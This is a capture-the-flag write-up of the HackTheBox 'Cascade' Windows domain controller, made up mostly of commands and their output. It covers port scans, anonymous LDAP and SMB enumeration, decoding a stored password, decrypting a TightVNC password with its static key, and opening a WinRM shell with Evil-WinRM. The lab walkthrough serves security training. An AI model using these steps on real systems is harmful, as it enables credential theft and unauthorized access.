
### Nmap Scan

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Cascade]
└─$ sudo nmap -sC -sV -O -oA nmap/initial 10.10.10.182
[sudo] password for darshan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-04-13 02:09 EDT
Nmap scan report for 10.10.10.182
Host is up (0.13s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  tcpwrapped
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-04-13T06:11:14
|_  start_date: 2024-04-13T06:06:22
| smb2-security-mode: 
|   210: 
|_    Message signing enabled and required
|_clock-skew: 2s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 116.83 seconds

```

Nmap All-ports scan

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Cascade]
└─$ nmap -p- --min-rate 10000 -oA nmap/allports 10.10.10.182 -Pn
Starting Nmap 7.93 ( https://nmap.org ) at 2024-04-13 02:23 EDT
Nmap scan report for 10.10.10.182
Host is up (0.13s latency).
Not shown: 65521 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49170/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 21.98 seconds
                                                                                                                                                                                                                                                            
```

Nmap ports detailed scan

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Cascade]
└─$ nmap -p 53,88,135,389,445,636,3268,3269,5985 -sV -sC -oA nmap/all-ports-detailed 10.10.10.182 -Pn
Starting Nmap 7.93 ( https://nmap.org ) at 2024-04-13 02:21 EDT
Nmap scan report for 10.10.10.182
Host is up (0.13s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-04-13 06:21:39Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 2s
| smb2-security-mode: 
|   210: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-04-13T06:21:51
|_  start_date: 2024-04-13T06:06:22

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.06 seconds

```

Rust scan

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Cascade]
└─$ rustscan -a 10.10.10.182 --ulimit 5000 --range 1-65535 -- -Pn -A -sC 
[~] Automatically increasing ulimit value to 5000.
Open 10.10.10.182:53
Open 10.10.10.182:88
Open 10.10.10.182:135
Open 10.10.10.182:139
Open 10.10.10.182:389
Open 10.10.10.182:445
Open 10.10.10.182:636
Open 10.10.10.182:3268
Open 10.10.10.182:3269
Open 10.10.10.182:5985
Open 10.10.10.182:49154
Open 10.10.10.182:49155
Open 10.10.10.182:49170
Open 10.10.10.182:49158
Open 10.10.10.182:49157
[~] Starting Nmap
[>] The Nmap command to be run is nmap -Pn -A -sC -vvv -p 53,88,135,139,389,445,636,3268,3269,5985,49154,49155,49170,49158,49157 10.10.10.182

Starting Nmap 7.93 ( https://nmap.org ) at 2024-04-13 02:21 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 02:21
Completed NSE at 02:21, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 02:21
Completed NSE at 02:21, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 02:21
Completed NSE at 02:21, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 02:21
Completed Parallel DNS resolution of 1 host. at 02:21, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 02:21
Scanning 10.10.10.182 [15 ports]
Discovered open port 139/tcp on 10.10.10.182
Discovered open port 135/tcp on 10.10.10.182
Discovered open port 88/tcp on 10.10.10.182
Discovered open port 53/tcp on 10.10.10.182
Discovered open port 389/tcp on 10.10.10.182
Discovered open port 3269/tcp on 10.10.10.182
Discovered open port 445/tcp on 10.10.10.182
Discovered open port 636/tcp on 10.10.10.182
Discovered open port 49155/tcp on 10.10.10.182
Discovered open port 49170/tcp on 10.10.10.182
Discovered open port 49157/tcp on 10.10.10.182
Discovered open port 5985/tcp on 10.10.10.182
Discovered open port 49154/tcp on 10.10.10.182
Discovered open port 3268/tcp on 10.10.10.182
Discovered open port 49158/tcp on 10.10.10.182
Completed Connect Scan at 02:21, 0.26s elapsed (15 total ports)
Initiating Service scan at 02:21
Scanning 15 services on 10.10.10.182
Completed Service scan at 02:22, 55.75s elapsed (15 services on 1 host)
NSE: Script scanning 10.10.10.182.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 02:22
NSE Timing: About 99.95% done; ETC: 02:22 (0:00:00 remaining)
Completed NSE at 02:23, 40.07s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 02:23
Completed NSE at 02:23, 3.75s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 02:23
Completed NSE at 02:23, 0.00s elapsed
Nmap scan report for 10.10.10.182
Host is up, received user-set (0.13s latency).
Scanned at 2024-04-13 02:21:26 EDT for 100s

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-04-13 06:21:36Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49154/tcp open  msrpc         syn-ack Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack Microsoft Windows RPC
49170/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 2s
| smb2-time: 
|   date: 2024-04-13T06:22:29
|_  start_date: 2024-04-13T06:06:22
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 2845/tcp): CLEAN (Timeout)
|   Check 2 (port 51409/tcp): CLEAN (Timeout)
|   Check 3 (port 10882/udp): CLEAN (Timeout)
|   Check 4 (port 62325/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   210: 
|_    Message signing enabled and required

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 02:23
Completed NSE at 02:23, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 02:23
Completed NSE at 02:23, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 02:23
Completed NSE at 02:23, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.36 seconds

```

**Summarizing the scan results**

- Based on the scan results, there is `Microsoft DNS 6.1.7601`  running on `Windows Server 2008 R2 SP1)` port `53`.
- The combination of services `(DNS 53, Kerberos 88, RPC 135, NetBIOS 139, LDAP 389, SMB 445, and others)` confirms that this is a domain controller.
- There’s also a DNS names on the `LDAP` service running on port `389` & port `3268`,  `cascade.local`.
- 

> I’ll start by enumerating with `SMB (port 445)` & `LDAP (port 389)`. My next tier of enumeration will be `Kerberos` , `DNS` and `RPC.` I could also use the `WinRM` , if I find any credentials.
> 

Enumerating `SMB`  service `(CrackMapExec)` :

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Cascade]
└─$ crackmapexec smb 10.10.10.182 -u '' -p ''              
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\: 
                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Cascade]
└─$ crackmapexec smb 10.10.10.182               
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Cascade]
└─$ crackmapexec smb 10.10.10.182 --shares    
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [-] Error enumerating shares: SMB SessionError: code: 0xc0000203 - STATUS_USER_SESSION_DELETED - The remote user session has been deleted.
                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Cascade]
└─$ crackmapexec smb 10.10.10.182 -u '' -p '' 
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\: 
                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Cascade]
└─$ crackmapexec smb 10.10.10.182 -u '' -p '' --shares
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\: 
SMB         10.10.10.182    445    CASC-DC1         [-] Error enumerating shares: SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
                                                                                                                                                                                                                                                            
```

i didn’t find the results of `crackmapexec` satisfying, so I decided to use `smbclient` for the same:

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Cascade]
└─$ smbclient -N -L //10.10.10.182
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.182 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

However, the results were same.

Moving on to enumerate the machine using `Ldapsearch` :

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Cascade]
└─$ ldapsearch -H ldap://10.10.10.182 -x -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingContexts: DC=cascade,DC=local
namingContexts: CN=Configuration,DC=cascade,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=cascade,DC=local
namingContexts: DC=DomainDnsZones,DC=cascade,DC=local
namingContexts: DC=ForestDnsZones,DC=cascade,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

```

I can dump all to a file with:

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Cascade]
└─$ ldapsearch -H ldap://10.10.10.182 -x -b "DC=cascade,DC=local" > ldap-anonymous
```

If I wanted to get just the people, I could provide a query::

```bash
                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Cascade]
└─$ ldapsearch -H ldap://10.10.10.182 -x -b "DC=cascade,DC=local" '(objectClass=person)' > ldap-people 
```

Now going through the data thoroughly, I found an interesting thing about the user `Ryan Thompson` at the very end, `cascadeLegacyPwd`: 

```bash
# Ryan Thompson, Users, UK, cascade.local
dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ryan Thompson
sn: Thompson
givenName: Ryan
distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200109193126.0Z
whenChanged: 20200323112031.0Z
displayName: Ryan Thompson
uSNCreated: 24610
memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
uSNChanged: 295010
name: Ryan Thompson
objectGUID:: LfpD6qngUkupEy9bFXBBjA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 132247339091081169
lastLogoff: 0
lastLogon: 132247339125713230
pwdLastSet: 132230718862636251
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: r.thompson
sAMAccountType: 805306368
userPrincipalName: r.thompson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132294360317419816
msDS-SupportedEncryptionTypes: 0
cascadeLegacyPwd: clk0bjVldmE=

```

It seems like `Base64` encoded, so I can decode the same using the following command:

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Cascade]
└─$ echo clk0bjVldmE= | base64 -d
rY4n5eva
```

So now, I have credentials of the user `Ryan Thompson` :

```bash
r.thompson:rY4n5eva
```

I’ll try to connect over `WinRM`:

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Cascade]
└─$ crackmapexec winrm 10.10.10.182 -u r.thompson -p rY4n5eva 
SMB         10.10.10.182    5985   CASC-DC1         [*] Windows 6.1 Build 7601 (name:CASC-DC1) (domain:cascade.local)
HTTP        10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
WINRM       10.10.10.182    5985   CASC-DC1         [-] cascade.local\r.thompson:rY4n5eva 
```

And it didn’t seem to work. 

I tried to connect using `Evil-WinRM` too, but it didn’t work here as well

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Cascade]
└─$ evil-winrm -i 10.10.10.182 -u r.thompson -p rY4n5eva      
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
                                        
Error: Exiting with code 1

```

Now, I tried to check if these credentials work with `SMB` using `crackmapexec:`

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Cascade]
└─$ crackmapexec smb -u r.thompson -p rY4n5eva --shares 10.10.10.182
SMB         10.10.10.182    445    CASC-DC1         [*] Windows 6.1 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
SMB         10.10.10.182    445    CASC-DC1         [+] Enumerated shares
SMB         10.10.10.182    445    CASC-DC1         Share           Permissions     Remark
SMB         10.10.10.182    445    CASC-DC1         -----           -----------     ------
SMB         10.10.10.182    445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.10.10.182    445    CASC-DC1         Audit$                          
SMB         10.10.10.182    445    CASC-DC1         C$                              Default share
SMB         10.10.10.182    445    CASC-DC1         Data            READ            
SMB         10.10.10.182    445    CASC-DC1         IPC$                            Remote IPC
SMB         10.10.10.182    445    CASC-DC1         NETLOGON        READ            Logon server share 
SMB         10.10.10.182    445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.10.10.182    445    CASC-DC1         SYSVOL          READ            Logon server share 

```

And it did! I had read permissions for the shares and the one that stood out was the `Data` share.

I checked out whether I was able to have the same visibility using `smbmap` too:

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Cascade]
└─$ smbmap -H 10.10.10.182 -u r.thompson -p rY4n5eva

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 10.10.10.182:445        Name: cascade.local             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Audit$                                                  NO ACCESS
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        print$                                                  READ ONLY       Printer Drivers
        SYSVOL                                                  READ ONLY       Logon server share 
                                                                                                                                                                                                                                                            
```

There’s a bunch of files in each of the shares I have access to. I use the following commands to just pull all the files in each share (Data for example):

```bash
                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Cascade]
└─$ smbclient --user r.thompson //10.10.10.182/data rY4n5eva
Password for [WORKGROUP\r.thompson]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jan 26 22:27:34 2020
  ..                                  D        0  Sun Jan 26 22:27:34 2020
  Contractors                         D        0  Sun Jan 12 20:45:11 2020
  Finance                             D        0  Sun Jan 12 20:45:06 2020
  IT                                  D        0  Tue Jan 28 13:04:51 2020
  Production                          D        0  Sun Jan 12 20:45:18 2020
  Temps                               D        0  Sun Jan 12 20:45:15 2020

                6553343 blocks of size 4096. 1625339 blocks available

```

```bash
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
NT_STATUS_ACCESS_DENIED listing \Contractors\*
NT_STATUS_ACCESS_DENIED listing \Finance\*
NT_STATUS_ACCESS_DENIED listing \Production\*
NT_STATUS_ACCESS_DENIED listing \Temps\*
getting file \IT\Email Archives\Meeting_Notes_June_2018.html of size 2522 as IT/Email Archives/Meeting_Notes_June_2018.html (4.8 KiloBytes/sec) (average 4.8 KiloBytes/sec)
getting file \IT\Logs\Ark AD Recycle Bin\ArkAdRecycleBin.log of size 1303 as IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log (2.5 KiloBytes/sec) (average 3.6 KiloBytes/sec)
getting file \IT\Logs\DCs\dcdiag.log of size 5967 as IT/Logs/DCs/dcdiag.log (11.3 KiloBytes/sec) (average 6.2 KiloBytes/sec)
getting file \IT\Temp\s.smith\VNC Install.reg of size 2680 as IT/Temp/s.smith/VNC Install.reg (5.1 KiloBytes/sec) (average 5.9 KiloBytes/sec)
```

Then I can see a nice list of the files with `find`:

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Cascade]
└─$ find smbclient-data -type f 
smbclient-data/IT/Logs/DCs/dcdiag.log
smbclient-data/IT/Logs/Ark AD Recycle Bin/ArkAdRecycleBin.log
smbclient-data/IT/Temp/s.smith/VNC Install.reg
smbclient-data/IT/Email Archives/Meeting_Notes_June_2018.html

```

There’s a couple interesting files. `Meeting_Notes_June_2018.html` presents like an email when viewed in Firefox:

![casc-1](https://github.com/darshannn10/HackTheBox/assets/87711310/4ec0e860-0e1a-47e3-8673-942faaef27c1)


```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Cascade]
└─$ cat "smbclient-data/IT/Temp/s.smith/VNC Install.reg" 
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
"ExtraPorts"=""
"QueryTimeout"=dword:0000001e
"QueryAcceptOnTimeout"=dword:00000000
"LocalInputPriorityTimeout"=dword:00000003
"LocalInputPriority"=dword:00000000
"BlockRemoteInput"=dword:00000000
"BlockLocalInput"=dword:00000000
"IpAccessControl"=""
"RfbPort"=dword:0000170c
"HttpPort"=dword:000016a8
"DisconnectAction"=dword:00000000
"AcceptRfbConnections"=dword:00000001
"UseVncAuthentication"=dword:00000001
"UseControlAuthentication"=dword:00000000
"RepeatControlAuthentication"=dword:00000000
"LoopbackOnly"=dword:00000000
"AcceptHttpConnections"=dword:00000001
"LogLevel"=dword:00000000
"EnableFileTransfers"=dword:00000001
"RemoveWallpaper"=dword:00000001
"UseD3D"=dword:00000001
"UseMirrorDriver"=dword:00000001
"EnableUrlParams"=dword:00000001
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
"AlwaysShared"=dword:00000000
"NeverShared"=dword:00000000
"DisconnectClients"=dword:00000001
"PollingInterval"=dword:000003e8
"AllowLoopback"=dword:00000000
"VideoRecognitionInterval"=dword:00000bb8
"GrabTransparentWindows"=dword:00000001
"SaveLogToAllUsersPath"=dword:00000000
"RunControlInterface"=dword:00000001
"IdleTimeout"=dword:00000000
"VideoClasses"=""
"VideoRects"=""

```

The line `"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f` jumped out as interesting.

Some reading about TightVNC shows that it stores the password in the register encrypted with a static key. There’s a bunch of tools out there to do it. I used [this](https://github.com/jeroennijhof/vncpwd). It takes a file with the ciphertext, which I created with `echo '6bcf2a4b6e5aca0f' | xxd -r -p > vnc_enc_pass`:

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Cascade]
└─$ echo '6bcf2a4b6e5aca0f' | xxd -r -p > vnc_enc_pas 
```

That command is using the `-r -p` options in `xxd` to convert from a hex string to ran binary.

I could also just use the Bash trick to treat command output as the contents of a file with `<( )`:

```bash
                                                                                                                                                                                                                                                            
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Cascade]
└─$ /opt/vncpwd/vncpwd vnc_enc_pas 
Password: sT333ve2
```

[This link](https://github.com/frizb/PasswordDecrypts) shows how to do it from within Metasploit, and it works as well:

```bash

msf6 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object

irb: warn: can't alias jobs from irb_jobs.
>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
=> "\x17Rk\x06#NX\a"
>> 
>> require 'rex/proto/rfb'
=> true
>> Rex::Proto::RFB::Cipher.decrypt ["6bcf2a4b6e5aca0f"].pack('H*'), fixedkey
=> "sT333ve2"

```

With these creds, `crackmapexec` shows that it is possible to get a shell over WinRM:

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Cascade]
└─$ crackmapexec winrm 10.10.10.182 -u s.smith -p sT333ve2
SMB         10.10.10.182    5985   CASC-DC1         [*] Windows 6.1 Build 7601 (name:CASC-DC1) (domain:cascade.local)
HTTP        10.10.10.182    5985   CASC-DC1         [*] http://10.10.10.182:5985/wsman
WINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\s.smith:sT333ve2 (Pwn3d!)
```

I’ll use `Evil-WinRM` to get a shell:

```bash
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Cascade]
└─$ evil-winrm -u s.smith -p sT333ve2 -i 10.10.10.182

                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\s.smith\Documents> whoami
cascade\s.smith
```

Grabbing the `user.txt`:

```bash
*Evil-WinRM* PS C:\Users\s.smith\Desktop> cat user.txt
...SNIP...
```

Enumerating the OS Version, I found out that the machine is actually `Windows 2008`:

```bash
*Evil-WinRM* PS C:\Users\s.smith\Desktop> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
6      1      7601   65536
```

Enumerating the user `s.smith` to find a horizontal/ vertical priv esc:

```bash
*Evil-WinRM* PS C:\Users\s.smith\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```

`s.smith` is a member of the `Audit Share` group:

```bash
*Evil-WinRM* PS C:\Users\s.smith\Desktop> net user s.smith
User name                    s.smith
Full Name                    Steve Smith
Comment
User's comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/28/2020 8:58:05 PM
Password expires             Never
Password changeable          1/28/2020 8:58:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 MapAuditDrive.vbs
User profile
Home directory
Last logon                   1/29/2020 12:26:39 AM

Logon hours allowed          All

Local Group Memberships      *Audit Share          *IT
                             *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.

```

That’s not a standard MS Group, so I’ll checked it out:

```bash
*Evil-WinRM* PS C:\Users\s.smith\Desktop> net localgroup "Audit Share"
Alias name     Audit Share
Comment        \\Casc-DC1\Audit$

Members

-------------------------------------------------------------------------------
s.smith
The command completed successfully.
```

